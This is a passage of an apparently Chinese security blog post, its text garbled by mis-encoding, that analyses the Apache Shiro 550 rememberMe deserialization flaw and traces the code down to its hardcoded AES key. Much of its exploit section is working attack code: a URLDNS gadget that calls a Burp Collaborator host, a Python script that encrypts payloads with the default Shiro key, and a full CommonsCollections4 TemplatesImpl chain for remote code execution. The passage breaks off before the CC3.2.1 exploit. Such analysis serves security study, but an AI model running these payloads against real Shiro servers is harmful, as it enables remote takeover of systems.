ä¸ºåœ¨æ‰“åŒ…ç¼–è¯‘æ—¶éœ€åœ¨jdk1.6ç¯å¢ƒä¸‹æ‰èƒ½æ‰§è¡Œ</p><p>åœ¨IDEAå®‰è£…ç›®å½•ä¸‹æ‰¾åˆ°<code>/plugins/maven/lib/maven3/conf/toolchains.xml</code>,(jdkåŒ…çš„è·¯å¾„æ ¹æ®è‡ªå·±çš„è¿›è¡Œä¿®æ”¹)ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">toolchain</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>jdk<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">provides</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">vendor</span>&gt;</span>sun<span class="tag">&lt;/<span class="name">vendor</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">provides</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">jdkHome</span>&gt;</span>D:\jdk\jdk1.6.0_45<span class="tag">&lt;/<span class="name">jdkHome</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">toolchain</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="ç¼–è¯‘æ‰“åŒ…"><a href="#ç¼–è¯‘æ‰“åŒ…" class="headerlink" title="ç¼–è¯‘æ‰“åŒ…"></a>ç¼–è¯‘æ‰“åŒ…</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mvn compile</span><br><span class="line">mvn package</span><br></pre></td></tr></table></figure><p>ç”Ÿæˆwaræ–‡ä»¶</p><h3 id="é…ç½®tomcat"><a href="#é…ç½®tomcat" class="headerlink" title="é…ç½®tomcat"></a>é…ç½®tomcat</h3><p>æ·»åŠ æ‰“åŒ…å¥½åçš„warå·¥ä»¶</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201316049.png" alt="image-20221120131650974"></p><p>æˆåŠŸå¯åŠ¨</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201317032.png" alt="image-20221120131728982"></p><p>å«Œé…ç½®è¿‡ç¨‹éº»çƒ¦çš„æœ‹å‹ä¹Ÿå¯ä»¥ç›´æ¥ç”¨githubä¸Šå·²æ‰“åŒ…å¥½çš„<a href="https://github.com/jas502n/SHIRO-550">waråŒ…</a></p><h2 id="åˆ©ç”¨é“¾åˆ†æ"><a href="#åˆ©ç”¨é“¾åˆ†æ" class="headerlink" title="åˆ©ç”¨é“¾åˆ†æ"></a>åˆ©ç”¨é“¾åˆ†æ</h2><h3 id="æ¼æ´ç‚¹"><a href="#æ¼æ´ç‚¹" class="headerlink" title="æ¼æ´ç‚¹"></a>æ¼æ´ç‚¹</h3><p>åœ¨ç™»å½•shiroæ—¶ï¼Œå¦‚æœç‚¹å‡»äº†rememberé€‰é¡¹ï¼Œå°±ä¼šç”Ÿæˆä¸€ä¸ªCookieæ¥ä¿å­˜ç™»å½•ä¿¡æ¯ï¼Œå®é™…ä¸Šåç«¯è¿›è¡Œçš„æ“ä½œæ˜¯å¯¹ç”¨æˆ·ç™»å½•ä¿¡æ¯è¿›è¡Œåºåˆ—åŒ–ï¼Œç„¶åè¿›è¡ŒAESåŠ å¯†ï¼Œæœ€åè¿›è¡Œbase64åç”ŸæˆCookieã€‚å½“ä½ ä¸‹æ¬¡ç™»å½•æ—¶ï¼Œä¼šæºå¸¦æ‰€ç”Ÿæˆçš„Cookieè¿›è¡Œç™»å½•</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201350793.png" alt="image-20221120135028691"></p><p>é‚£ä¹ˆï¼Œå¦‚æœèƒ½æ§åˆ¶Cookieä¸ºæ¶æ„çš„åºåˆ—åŒ–ä»£ç ï¼Œç„¶åé€šè¿‡ç›¸åŒçš„åŠ å¯†åä¼ å…¥ï¼Œé‚£ä¹ˆåç«¯å°±ä¼šç›¸åº”çš„è§£å¯†ååºåˆ—åŒ–ï¼Œæœ€åæ‰§è¡Œæ‰€ä¼ å…¥çš„æ¶æ„ä»£ç </p><p><strong>Gadget</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><h3 id="åˆ©ç”¨æµç¨‹"><a href="#åˆ©ç”¨æµç¨‹" class="headerlink" title="åˆ©ç”¨æµç¨‹"></a>åˆ©ç”¨æµç¨‹</h3><p>å…¨æ–‡æœç´¢ä¸<code>Cookie</code>æˆ–è€…<code>RememberMe</code>ç›¸å…³çš„ç±»ä¸æ–¹æ³•</p><p>åœ¨<code>CookieRememberMeManager</code>ä¸­å‘ç°<code>getRememberedSerializedIdentity()</code>,å¤§æ¦‚æ‰§è¡Œçš„æ“ä½œå°±æ˜¯è·å–ä¼ å…¥çš„Cookieï¼Œå¯¹å…¶è¿›è¡Œbase64è§£å¯†</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201359903.png" alt="image-20221120135906868"></p><p>å¾€ä¸Šè·Ÿï¼Œåœ¨<code>AbstractRememberMeManager.getRememberedPrincipals</code>ä¸­è°ƒç”¨äº†<code>getRememberedSerializedIdentity()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201403261.png" alt="image-20221120140359229"></p><p><code>getRememberedSerializedIdentity()</code>è°ƒç”¨<code>convertBytesToPrincipals()</code>å¯¹è·å–åˆ°base64è§£å¯†åçš„Cookieè¿›è¡Œè§£æ</p><p>è·Ÿè¿›<code>convertBytesToPrincipals()</code>ï¼Œæ“ä½œå¾ˆç›´è§‚ï¼Œå¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè§£å¯†åå†è°ƒç”¨<code>deserialize()</code>å¯¹å…¶è¿›è¡Œååºåˆ—åŒ–æ“ä½œ</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201408538.png" alt="image-20221120140801513"></p><p>è·Ÿè¿›<code>deserialize()</code>ï¼Œè¿™é‡Œå…¶å®å°±æ˜¯è¿›è¡Œäº†ä¸€ä¸ªååºåˆ—åŒ–æ“ä½œï¼Œæ‰€ä»¥å¦‚æœç¯å¢ƒä¸‹æœ‰ccä¾èµ–æˆ–è€…å…¶ä»–çš„ä¸€äº›ä¾èµ–ï¼Œå°±å¯ä»¥ç›´æ¥åˆ©ç”¨æ¥æ‰“æ¼æ´äº†</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201410867.png" alt="image-20221120141027840"></p><p>ä¸»è¦æ¥çœ‹çœ‹å®ƒè§£å¯†çš„ä¸€ä¸ªæ“ä½œæµç¨‹ï¼Œè·Ÿè¿›<code>decrypt()</code></p><p><code>AbstractRememberMeManager.decrypt()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201414252.png" alt="image-20221120141422227"></p><p>ç»§ç»­è·Ÿï¼Œ<code>CipherService.decrypt()</code>ï¼Œæœ‰ä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä¸ºéœ€è¦åŠ å¯†çš„å­—ç¬¦ä¸²ï¼Œç¬¬äºŒä¸ªå‚æ•°ä¸ºåŠ å¯†æ‰€éœ€è¦çš„Key</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201416866.png" alt="image-20221120141623844"></p><p>é‡ç‚¹å…³æ³¨keyçš„è·å–æµç¨‹ï¼Œå¦‚æœèƒ½è·å–åˆ°keyï¼Œå°±èƒ½é€šè¿‡ç›¸åŒçš„åŠ å¯†æ„é€ å‡ºæ¶æ„åºåˆ—åŒ–ä»£ç </p><p>è·Ÿè¿›<code>JcaCipherService.decrypt(InputStream in, OutputStream out, byte[] key, boolean ivPrepended)</code>ï¼Œè¿™é‡Œçš„è§£å¯†å¯†é’¥é€šè¿‡<code>getDecryptionCipherKey()</code>è·å¾—</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201427833.png" alt="image-20221120142726802"></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201427907.png" alt="image-20221120142740890"></p><p>å‘ç°è¿”å›çš„keyæ˜¯ä¸€ä¸ªå¸¸é‡</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201428696.png" alt="image-20221120142810674"></p><p>å¾€ä¸Šæ‰¾ï¼Œçœ‹è¿™ä¸ªå¸¸é‡æ˜¯åœ¨å“ªé‡Œèµ‹å€¼çš„</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201429109.png" alt="image-20221120142927085"></p><p>ç»§ç»­å¾€ä¸Š</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201430715.png" alt="image-20221120143035691"></p><p>å¾€ä¸Šæ‰¾åœ¨å“ªå„¿è°ƒç”¨äº†<code>setCipherKey()</code>,æœ€ç»ˆæ˜¯åœ¨<code>AbstractRememberMeManager()</code>ä¸­æ‰¾åˆ°keyå…¶å®æ˜¯<code>DEFAULT_CIPHER_KEY_BYTES</code>è¿™ä¸ªå¸¸é‡</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201431512.png" alt="image-20221120143148491"></p><p>è€Œè¿™ä¸ªå¸¸é‡æ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼ï¼Œè€Œå®ƒçš„åŠ å¯†ç®—æ³•ï¼Œå®é™…ä¸Šå°±æ˜¯ä¸€ä¸ªAESç®—æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201433916.png" alt="image-20221120143349891"></p><h2 id="Expç¼–å†™"><a href="#Expç¼–å†™" class="headerlink" title="Expç¼–å†™"></a>Expç¼–å†™</h2><h3 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h3><p>åœ¨è¿›è¡Œåˆ©ç”¨æ—¶ï¼Œéœ€è¦å…ˆåˆ é™¤æ‰Cookieä¸­çš„<code>JSESSIONID</code>ï¼Œå¦åˆ™æ˜¯ä¸ä¼šè¿›è¡Œåˆ°<code>rememberMe</code>çš„</p><h3 id="URLDNSé“¾æµ‹è¯•"><a href="#URLDNSé“¾æµ‹è¯•" class="headerlink" title="URLDNSé“¾æµ‹è¯•"></a>URLDNSé“¾æµ‹è¯•</h3><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IllegalAccessException, ClassNotFoundException, IOException, NoSuchFieldException &#123;</span><br><span class="line">        HashMap&lt;URL, Integer&gt; hashmap = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        URL url=<span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://o6vqlz6ye493cdll4txuv0odp4vujj.burpcollaborator.net&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Class clazz=Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        Field hashcode=clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashcode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        hashcode.set(url,<span class="number">123</span>);</span><br><span class="line">        hashmap.put(url, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        hashcode.set(url,-<span class="number">1</span>);</span><br><span class="line">        serialize(hashmap);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object obj)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=<span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>AESåŠ å¯†</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">convert_bin</span>(<span class="params">file</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">return</span> f.read()</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">AES_enc</span>(<span class="params">data</span>):</span><br><span class="line">    BS=AES.block_size</span><br><span class="line">    pad=<span class="keyword">lambda</span> s:s+((BS-<span class="built_in">len</span>(s)%BS)*<span class="built_in">chr</span>(BS-<span class="built_in">len</span>(s)%BS)).encode()</span><br><span class="line">    key=<span class="string">&quot;kPH+bIxk5D2deZiIxcaaaA==&quot;</span></span><br><span class="line">    mode=AES.MODE_CBC</span><br><span class="line">    iv=uuid.uuid4().<span class="built_in">bytes</span></span><br><span class="line">    encryptor=AES.new(base64.b64decode(key),mode,iv)</span><br><span class="line">    ciphertext=base64.b64encode(iv+encryptor.encrypt(pad(data)))</span><br><span class="line">    <span class="keyword">return</span> ciphertext</span><br><span class="line"> </span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    data=convert_bin(<span class="string">&quot;ser.bin&quot;</span>)</span><br><span class="line">    <span class="built_in">print</span>(AES_enc(data))</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201523977.png" alt="image-20221120152302864"></p><h3 id="Apache-CommonsCollections4-0åˆ©ç”¨é“¾"><a href="#Apache-CommonsCollections4-0åˆ©ç”¨é“¾" class="headerlink" title="Apache CommonsCollections4.0åˆ©ç”¨é“¾"></a>Apache CommonsCollections4.0åˆ©ç”¨é“¾</h3><p>ç”±äºshiroä¸­é»˜è®¤æ²¡æœ‰cc4ä¾èµ–ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å¯¼å…¥ä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.commons<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections4<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>ç›´æ¥ç”¨cc2å°±èƒ½æ‰“</p><p><strong>exp</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Files;</span><br><span class="line"><span class="keyword">import</span> java.nio.file.Paths;</span><br><span class="line"><span class="keyword">import</span> java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SuppressWarnings(value=&quot;all&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">demo1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> templates.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">nameField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_name&quot;</span>);</span><br><span class="line">        nameField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        nameField.set(templates,<span class="string">&quot;aaa&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">bytecodesField</span> <span class="operator">=</span> c1.getDeclaredField(<span class="string">&quot;_bytecodes&quot;</span>);</span><br><span class="line">        bytecodesField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] code = Files.readAllBytes(Paths.get(<span class="string">&quot;D:\\BadClass\\Calc.class&quot;</span>));</span><br><span class="line">        <span class="type">byte</span>[][] codes = &#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"><span class="comment">//                templates.newTransformer();</span></span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>&lt;&gt;(<span class="string">&quot;newTransformer&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;&#125;, <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line"><span class="comment">//        chain.transform(1);</span></span><br><span class="line">        <span class="type">TransformingComparator</span> <span class="variable">transformingComparator</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TransformingComparator</span>&lt;&gt;(<span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>&lt;&gt;(<span class="number">1</span>));</span><br><span class="line">        <span class="type">PriorityQueue</span> <span class="variable">priorityQueue</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(<span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c</span> <span class="operator">=</span> transformingComparator.getClass();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">transformerField</span> <span class="operator">=</span> c.getDeclaredField(<span class="string">&quot;transformer&quot;</span>);</span><br><span class="line">        transformerField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        transformerField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">        serialize(priorityQueue);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">(Object object)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;ser.bin&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">os</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fos);</span><br><span class="line">        os.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201701768.png" alt="image-20221120170122708"></p><h3 id="Apache-CommonsCollections3-2-1åˆ©ç”¨é“¾"><a href="#Apache-CommonsCollections3-2-1åˆ©ç”¨é“¾" class="headerlink" title="Apache CommonsCollections3.2.1åˆ©ç”¨é“¾"></a>Apache CommonsCollections3.2.1åˆ©ç”¨é“¾</h3><p>ç”±äºshiroä¸­é»˜è®¤æ²¡æœ‰cc3.2.1ä¾èµ–ï¼Œæ‰€ä»¥éœ€è¦æ‰‹åŠ¨å¯¼å…¥ä¸€ä¸‹</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>å…ˆæ‹¿cc6è¿›è¡Œæµ‹è¯•ï¼Œç»“æœå‘ç°æ¶æ„ä»£ç å¹¶æ²¡æœ‰æ‰§è¡ŒæˆåŠŸï¼ŒæŸ¥çœ‹tomcatæ—¥å¿—ï¼Œå‘ç°å¦‚ä¸‹æŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201547677.png" alt="image-20221120154725647"></p><p>åˆ†ææŠ¥é”™ï¼Œâ€œæ— æ³•åŠ è½½åˆ°Transformerâ€è¿™ä¸ªç±»</p><p>åœ¨cc6ä¸­æˆ‘ä»¬ä½¿ç”¨äº†ä¸€ä¸ªTransfomeræ•°ç»„å»è¿›è¡Œpayloadçš„æ„é€ </p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201549861.png" alt="image-20221120154917835"></p><p>é‚£ä¹ˆä¸ºä»€ä¹ˆåŠ è½½ä¸åˆ°è¿™ä¸ªç±»å‘¢ï¼Ÿè·Ÿè¿›åˆ°å®ƒååºåˆ—åŒ–æ—¶çš„å¤„ç†ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶ï¼Œå®ƒå¹¶ä¸æ˜¯è°ƒç”¨åŸç”Ÿçš„ååºåˆ—åŒ–æ“ä½œï¼Œè€Œæ˜¯è°ƒç”¨<code>ClassResolvingObjectInputStream()</code>è¿›è¡Œä¸€ä¸ªå¤„ç†ï¼Œè€Œ<code>ClassResolvingObjectInputStream()</code>æ˜¯shiroé‡Œé¢è‡ªå®šä¹‰çš„ä¸€ä¸ªè¾“å…¥æµã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201627122.png" alt="image-20221120162740081"></p><p>è·Ÿè¿›<code>ClassResolvingObjectInputStream</code>,é—®é¢˜å‡ºåœ¨<code>resolveClass()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201637941.png" alt="image-20221120163701915"></p><p>æ­£å¸¸åœ¨ååºåˆ—åŒ–ä¸­ï¼Œæ˜¯ä¸€å®šä¼šç»è¿‡<code>resolveClass()</code>å¤„ç†çš„</p><p>è€Œåœ¨<code>ClassResolvingObjectInputStream</code>ç±»ä¸­é‡å†™äº†<code>resolveClass()</code>ï¼Œåœ¨è¿›è¡Œååºåˆ—åŒ–æ—¶å°±ä¼šè°ƒç”¨é‡å†™çš„<code>resolveClass()</code>è¿›è¡Œä¸€ä¸ªå¤„ç†</p><p>å¯¹æ¯”ä¸€ä¸‹åŸç”Ÿçš„<code>ObjectInputStream.resolveClass()</code></p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201639734.png" alt="image-20221120163942702"></p><p>åŸç”Ÿçš„<code>resolveClass()</code>æ˜¯è°ƒç”¨<code>Class.forName</code>è¿›è¡Œä¸€ä¸ªç±»åŠ è½½ï¼Œè€Œshiroé‡å†™çš„<code>resolveClass()</code>æ˜¯è°ƒç”¨shiroè‡ªå®šä¹‰çš„<code>ClassUtils.forName</code>åŠé€†è¡Œç±»åŠ è½½</p><p>è·Ÿè¿›ClassUtils</p><p><img src="https://cdn.jsdelivr.net/gh/gh0st-9/images/image/202211201644404.png" alt="image-20221120164451371"></p><p>å¯ä»¥å‘ç°ClassUtilsåŠ è½½ç±»æ—¶æ˜¯è°ƒç”¨<code>Classloader</code>è¿›è¡Œçš„ä¸€ä¸ªç±»åŠ è½½ï¼Œè€Œ<code>Classloader</code>æ˜¯ä¸èƒ½åŠ è½½æ•°ç»„ç±»çš„</p><p>å†å¾€åå¯¹å®ƒçš„åŸç†å°±ä¸å†å…·ä½“æ·±ç©¶äº†ï¼Œå› ä¸ºåé¢çš„åˆ†æå’Œå®‰å…¨å…¶å®å°±æ²¡æœ‰å¾ˆå¤§çš„å…³ç³»äº†ï¼Œæ˜¯Tomcatå†…ç½®çš„ä¸€äº›ç±»åŠ è½½çš„ç»†èŠ‚</p><p>expçš„æ„é€ 